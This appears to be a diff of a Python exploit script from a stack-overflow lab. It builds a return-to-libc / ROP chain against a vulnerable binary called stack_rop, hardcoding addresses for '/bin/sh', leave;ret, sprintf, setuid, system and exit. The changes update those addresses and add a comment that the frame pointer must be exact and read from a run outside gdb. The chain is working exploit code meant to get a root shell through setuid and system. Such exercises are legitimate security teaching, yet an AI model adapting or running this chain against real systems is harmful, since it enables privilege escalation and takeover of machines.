@@ -6,13 +6,13 @@ def tobytes (value):
 
 content = bytearray(0xaa for i in range(112))
 
-sh_addr      = 0xbffffdd0   # Address of "/bin/sh"
-leaveret     = 0x08048565   # Address of leaveret
+sh_addr      = 0xbffffef0   # Address of "/bin/sh"
+leaveret     = 0x08048580   # Address of leaveret
 sprintf_addr = 0xb7e516d0   # Address of sprintf()
 setuid_addr  = 0xb7eb9170   # Address of setuid()
 system_addr  = 0xb7e42da0   # Address of system()
 exit_addr    = 0xb7e369d0   # Address of exit()
-ebp_foo      = 0xbfffe4c8   # foo()'s frame pointer
+ebp_foo      = 0xbfffeb28   # foo()'s frame pointer --- this value MUST be EXACT! Obtain outside of gdb (i.e., from running ./stack_rop)
 
 # Calculate the address of setuid()'s 1st argument
 sprintf_arg1 = ebp_foo + 12 + 5*0x20           
